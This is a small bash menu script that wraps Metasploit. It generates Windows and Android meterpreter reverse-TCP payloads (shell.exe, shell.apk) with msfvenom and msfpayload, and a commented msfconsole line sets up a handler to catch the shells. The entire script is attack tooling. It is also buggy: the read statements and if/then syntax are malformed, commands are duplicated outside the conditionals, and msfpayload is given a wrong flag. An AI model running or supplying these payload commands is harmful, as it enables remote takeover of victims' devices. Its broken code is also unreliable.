echo "enter option"
echo "1 -Generate payload"
echo "2 -Exploit system(Msfconsole)"
echo "enter 1 or 2"
read op1



if [ $op1 -eq 1 ] then
echo enter listner ip
read $ip
echo enter listners port
read $port
	echo "1 -For windows payload"
	echo "2 -for android payload"
	read op2	
	if [ $op2 -eq 1 ] then	
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > shell.exe
	echo "shell.exe created!"
	elif [ $op2 -eq 2 ] then
msfpayload -p android/meterpreter/reverse_tcp LHOST=192.168.1.16 LPORT=4444 R > shell.apk
	echo "shell.apk created!"
		

fi



msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > shell.exe
echo "shell.exe created!"

msfpayload -p android/meterpreter/reverse_tcp LHOST=192.168.1.16 LPORT=4444 R > shell.apk
echo "shell.apk created!"

#to run payload
# msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/x86/shell/reverse_tcp; set LHOST 192.168.1.101; set LPORT 443; run
